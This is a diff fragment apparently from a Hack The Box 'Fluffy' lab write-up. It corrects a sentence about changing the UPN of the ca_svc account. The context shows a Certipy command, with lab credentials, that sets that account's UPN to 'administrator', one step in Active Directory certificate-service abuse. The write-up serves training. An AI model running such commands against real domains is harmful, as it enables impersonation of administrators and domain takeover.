@@ -681,7 +681,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
     whenChanged                         : 2025-07-01T00:55:32+00:00
 ```
 
-We can see the SPN as ADCS, now we can change it to Administrator.
+We can see the UPN as ca_svc, now we can change it to Administrator.
 ```bash
 certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
 ```
